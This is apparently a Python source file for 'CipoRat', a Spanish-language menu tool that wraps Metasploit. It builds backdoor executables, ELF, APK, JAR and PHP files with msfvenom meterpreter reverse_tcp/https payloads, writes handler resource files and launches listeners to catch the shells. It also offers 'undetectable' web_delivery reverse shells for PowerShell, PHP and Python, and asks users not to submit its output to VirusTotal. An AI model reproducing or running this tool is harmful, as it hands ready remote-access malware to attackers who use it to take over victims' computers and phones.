#No deberías estar leyendo esto.
#Cualquier cosa que se modifique aqui puede romper el funcionamiento del programa.

import os
import sys
import time

#sys.stdout.write("\033[1;31m")
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    cyan = '\e[0;36m'
    green = '\e[0;34m'
    okegreen = '\033[92m'
    lightgreen = '\e[1;32m'
    white = '\e[1;37m'
    red = '\e[1;31m'
    yellow = '\e[0;33m'
    BlueF = '\e[1;34m'  # Biru
    RESET = "\033[00m"  # normal
    orange = '\e[38;5;166m'
    print("#############################################################")
    print(r"#                  -=\\`\\                                  #")
    print(r"#              |\\ ____\\_\\__                              #")
    print(r"#            -=\\c`) ) ) ) )  /                             #")
    print(r"#               `~~~~~/ /~~`-`                              #")
    print(r"#                 -==/ /                                    #")
    print(r"#                 ╔╦═╦╦════╦╦══╦══╦════╗                    #")
    print(r"#                 ║║╔╬╬═╦═╦╣╠╦═╣║║╠═╦═╗║                    #")
    print(r"#                 ║║╚╣║║║║╠╗╔╣╩╣║║╠╝║║║║                    #")
    print(r"#                 ║╚═╩╣╔╩═╝╚═╩═╩╩╩╩═╩╩╝║                    #")
    print(r"#                 ╚═══╩╩═══════════════╝                    #")
    print(r"#                  _  _                                     #")
    print(r"#                 ( `   )_                                  #")
    print(r"#                (    )    `)                               #")
    print(r"#              (_   (_ .  _) _)                             #")
    print(r"#             _ .                        ( `   )_           #")
    print(r"#   ███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃         (    )    `)         #")
    print(r"#  ▂▄▅█████████▅▄▃▂                   (_   (_ .  _) _)      #")
    print(r"# [███████████████████].                                    #")
    print(r"#  ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                                       #")
    print(r"#                                                           #")
    print(r"#             _ _                                           #")
    print(r"#           (  _ )_                                         #")
    print(r"#         (_  _(_ ,)                                        #")
    print(r"#############################################################")
    
    print('AVISO: SE DETECTA QUE ESTÁS USANDO WINDOWS, ESTA HERRAMIENTA NO ES COMPATIBLE CON TU OS' if os.name == 'nt' else '')
    print("Bienvenido a mi herramienta de libre uso.\n")
    print("1 - Backdoor con msfvenom")
    print("2 - Backdoor 100% indetectable (Antivirus Bypass) *En desarrollo*")
    print("3 - Información")
    print("4 - Instalar metasploit")
    print("5 - Abrir listener en metasploit")
    print("6 - Actualizar CipoRat")
    print("7 - Salir\n")
    opcion= input("Selecciona una opción: ")
    if opcion == "1":
        os.system('clear')
        print("\n1 - Backdoor-Windows con meterpreter (reverse_tcp) *Recomendado*")
        print("2 - Backdoor-Windows con meterpreter (reverse_https)")
        print("3 - Backdoor-Linux con meterpreter (reverse_tcp)")
        print("4 - Backdoor-Linux con meterpreter (reverse_https)")
        print("5 - Backdoor-VPS con meterpreter (reverse_tcp)")
        print("6 - Backdoor-Java con meterpreter (reverse tcp)")
        print("7 - Backdoor-Android con meterpreter (reverse_tcp)")
        print("8 - Salir al menu principal\n")
        msfvenom = input("Selecciona una opcion: ")
        if msfvenom == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("Que nombre le quieres dar al archivo?: ")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload windows/meterpreter/reverse_tcp\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue

        elif msfvenom == "2":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("¿Que nombre le quieres dar al archivo?")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p windows/meterpreter/reverse_https lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload windows/meterpreter/reverse_https\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue

        elif msfvenom == "3":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("Que nombre le quieres dar al archivo?: ")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp lhost={} lport={} -f elf -o {}.elf".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload linux/x64/meterpreter/reverse_tcp\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue

        elif msfvenom == "4":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("Que nombre le quieres dar al archivo?: ")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p linux/x64/meterpreter/reverse_https lhost={} lport={} -f elf -o {}.elf".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload linux/x64/meterpreter/reverse_https\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue
        elif msfvenom == "5":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("Que nombre le quieres dar al archivo?: ")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p php/meterpreter_reverse_tcp lhost={} lport={} -f raw -o {}".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload php/meterpreter_reverse_tcp\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue
        elif msfvenom == "6":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("Que nombre le quieres dar al archivo?: ")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p java/meterpreter/reverse_tcp lhost={} lport={} -f jar -o {}.jar".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload java/meterpreter/reverse_tcp\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue

        elif msfvenom == "7":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            output = input("Que nombre le quieres dar al archivo?: ")
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\nCreando exploit...")
            os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} -o {}.apk".format(lhost, lport, output))
            salir = input("Desea abrir el listener de metasploit? (s/n): ")
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/handler\n")
                f.write("set payload android/meterpreter/reverse_tcp\n")
                f.write("set lhost 0.0.0.0\n")
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            if salir == "s":
                os.system("msfconsole -r meta.rc")
            else:
                continue

    elif opcion == "2":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("1 - Backdoor Indetectable (Powershell, válido para: Windows)")
        print("2 - Backdoor Indetectable (PHP, válido para: Linux, Vps)")
        print("3 - Backdoor Indetectable (Python, válido para: Windows, Linux, VPS)")
        print("4 - Salir al menú principal\n")
        code = input("Selecciona una opción: ")
        if code == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            os.system('cls' if os.name == 'nt' else 'clear')
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/script/web_delivery\n")
                f.write("set payload generic/shell_reverse_tcp\n")
                f.write("set target 2\n")
                f.write("set lhost {}\n".format(lhost))
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            print("\nGenerando código...\n")
            time.sleep(5)
            os.system("msfconsole -r meta.rc")

        elif code == "2":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            os.system('cls' if os.name == 'nt' else 'clear')
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/script/web_delivery\n")
                f.write("set payload generic/shell_reverse_tcp\n")
                f.write("set target 1\n")
                f.write("set lhost {}\n".format(lhost))
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            print("\nGenerando código...\n")
            time.sleep(5)
            os.system("msfconsole -r meta.rc")

        elif code == "3":
            os.system('cls' if os.name == 'nt' else 'clear')
            lhost = input("Escribe la dirección ip o dns: ")
            lport = int(input("Escribe el puerto: "))
            os.system('cls' if os.name == 'nt' else 'clear')
            f = open("meta.rc", "w+")
            for i in range(1):
                f.write("use exploit/multi/script/web_delivery\n")
                f.write("set payload python/meterpreter_reverse_tcp\n")
                f.write("set target 1\n")
                f.write("set lhost {}\n".format(lhost))
                f.write("set lport {}\n".format(lport))
                f.write("exploit")
            f.close()
            print("\nGenerando código...\n")
            time.sleep(5)
            os.system("msfconsole -r meta.rc")

    elif opcion == "3":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("* Esta herramienta fue creada por CipoteMan\n")
        print("* El principal motivo de esta herramienta es facilitar el uso de metasploit\n")
        print("* Se ruega no subir los archivos a www.virustotal.com\n")
        print("* Si quieres ayudarme con este proyecto este es mi discord: CipoteMan#3436\n")
        print("* Espero que te sirva de utilidad :D\n")
        print("")
        variable = input("Desea volver al menu principal? (s/n): ")
        if variable == "s":
            continue
        else:
            break
    elif opcion == "4":
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == "nt":
            print("Nuestro sistema detecta que estás usando Windows.")
            print("Este Framework no está diseñado para windows pero podemos ayudarte a añadirle compatibilidad.")
            print("Para añadirle compatibilidad se necesita descargar los siguientes archivos: ")
            os.system("start https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe")
            os.system("start https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.6.3-1/rubyinstaller-devkit-2.6.3-1-x64.exe")
        else:
            seguro = input("Metasploit es necesario para que funcione este programa, quieres continuar? (s/n): ")
            if seguro == "s":
                os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")
            else:
                continue
    elif opcion == "5":
        os.system('cls' if os.name == 'nt' else 'clear')
        payload = input("Inserte el payload: ")
        lhost = input("Inserte la ip o -dns (LHOST): ")
        lport = input("Inserte el puerto (LPORT): ")
        f = open("listener.rc", "w+")
        for i in range(1):
            f.write("use exploit/multi/handler\n")
            f.write("set payload {}\n".format(payload))
            f.write("set lhost {}\n".format(lhost))
            f.write("set lport {}\n".format(lport))
            f.write("exploit")
        f.close()
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Inciando listener...")
        os.system("msfconsole -r listener.rc")
    elif opcion == "6":
        os.system("python actualizar.py" if os.name == "nt" else "python3 actualizar.py")

    elif opcion == "7":
        break

    else:
        break
